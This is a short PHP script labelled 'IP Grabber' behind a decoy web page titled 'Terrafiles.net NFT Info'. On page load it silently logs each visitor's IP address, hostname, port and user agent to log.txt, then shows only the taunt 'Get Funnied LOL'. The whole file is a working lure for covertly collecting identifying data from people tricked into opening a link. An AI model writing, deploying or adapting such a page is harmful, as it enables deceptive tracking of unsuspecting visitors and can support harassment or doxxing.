<?php
 
//IP Grabber
 
//Variables
 
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('log.txt', 'a');
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fclose($fh);
?>
<!doctype html>
<html>
    <head>
        <title>Terrafiles.net NFT Info</title>
    </head>
    <body>
        <center>
            <h1 style="font-size: 150px;">Get Funnied LOL</h1>
        </center>
    </body>
</html>